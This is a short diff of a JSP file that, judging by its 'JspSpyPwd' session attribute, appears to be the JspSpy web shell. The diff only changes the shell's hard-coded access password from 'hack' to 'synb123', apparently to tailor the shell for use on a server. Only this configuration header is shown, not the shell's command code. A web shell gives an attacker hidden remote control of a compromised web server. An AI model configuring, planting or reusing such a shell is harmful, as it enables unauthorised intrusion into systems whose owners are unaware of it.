@@ -16,7 +16,7 @@
 <%@page import="java.awt.datatransfer.DataFlavor"%>
 <%@page import="java.util.prefs.Preferences"%>
 <%!
-	private static final String PW = "hack"; //password
+	private static final String PW = "synb123"; //password
 	private static final String PW_SESSION_ATTRIBUTE = "JspSpyPwd";
 	private static final String REQUEST_CHARSET = "ISO-8859-1";
 	private static final String PAGE_CHARSET = "UTF-8";
